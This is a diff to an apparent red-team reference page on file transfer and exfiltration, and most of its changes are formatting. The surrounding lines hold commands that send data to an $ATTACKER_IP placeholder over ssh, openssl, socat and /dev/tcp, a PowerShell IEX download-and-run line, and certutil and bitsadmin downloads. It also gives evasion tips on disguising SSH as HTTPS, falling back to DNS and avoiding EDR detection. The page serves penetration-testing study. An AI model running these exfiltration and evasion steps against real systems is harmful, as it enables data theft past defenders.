@@ -73,7 +73,7 @@ Copy-Item C:\file.txt Z:\
 
 :::
 
-> **OPSEC**: SMB (445) is often blocked outbound. Use only on internal networks.
+> SMB (445) is often blocked outbound. Use only on internal networks.
 
 ## FTP
 
@@ -135,7 +135,7 @@ ssh user@$ATTACKER_IP "tar czf - /remote/dir" | tar xzf - -C /local/dir
 
 :::
 
-> **OPSEC**: SCP/SFTP use port 22 by default. If 22 is blocked, run SSH on 443 (`sshd_config`: `Port 443`), it blends into HTTPS traffic.
+> SCP/SFTP use port 22 by default. If 22 is blocked, run SSH on 443 (`sshd_config`: `Port 443`), it blends into HTTPS traffic.
 
 ## DNS
 
@@ -164,9 +164,13 @@ openssl s_client -quiet -connect $ATTACKER_IP:53 < file
 
 :::
 
-> **OPSEC**: DNS (53) is rarely blocked outbound, but slow. Use as a fallback when HTTP and SSH are blocked.
+> DNS (53) is rarely blocked outbound, but slow. Use as a fallback when HTTP and SSH are blocked.
 
-## PowerShell
+## Windows
+
+:::tabs
+
+== PowerShell
 
 ::: code-group
 
@@ -186,9 +190,7 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 Invoke-FileUpload -Uri $URL -File <file>
 ```
 
-:::
-
-## LOLBins (Windows)
+== LOLBins
 
 Signed Microsoft binaries, present by default. Less likely to trip app-control than a downloaded `nc.exe`.
 
@@ -207,9 +209,9 @@ certutil.exe -encode C:\file.txt C:\file.b64
 bitsadmin /transfer job /download /priority foreground http://$ATTACKER_IP:$ATTACKER_PORT/file C:\Temp\file
 ```
 
-:::
+> EDR still flags the command line. `certutil -urlcache` is a well-known pattern.
 
-> **OPSEC**: EDR still flags the command line. `certutil -urlcache` is a well-known pattern.
+:::
 
 ## Linux
 
@@ -232,7 +234,7 @@ cat <&3
 
 :::
 
-> **OPSEC**: `/dev/tcp` requires bash compiled with `--enable-net-redirections`. Not available in `sh`/`dash`.
+> `/dev/tcp` requires bash compiled with `--enable-net-redirections`. Not available in `sh`/`dash`.
 
 ## Encrypted Transfer
 
@@ -240,7 +242,9 @@ TLS wraps a transfer that would otherwise be plaintext. Use it when the protocol
 
 > **Certificates**: see [cryptography/certificates.md](../cryptography/certificates.md) for generation. The blocks below assume you already have a `server.pem`.
 
-### Socat (TLS)
+:::tabs
+
+=== Socat (TLS)
 
 The `-u` flag makes the transfer unidirectional, which is what you want for a file. Without it, socat waits for a response that never comes.
 
@@ -256,11 +260,9 @@ socat -u OPENSSL-LISTEN:$ATTACKER_PORT,reuseaddr,cert=server.pem,verify=0 OPEN:l
 socat -u FILE:loot.tar.gz OPENSSL:$ATTACKER_IP:$ATTACKER_PORT,verify=0
 ```
 
-:::
-
 > `verify=0` skips certificate validation.
 
-### OpenSSL (s_server / s_client)
+=== OpenSSL (s_server / s_client)
 
 ::: code-group
 
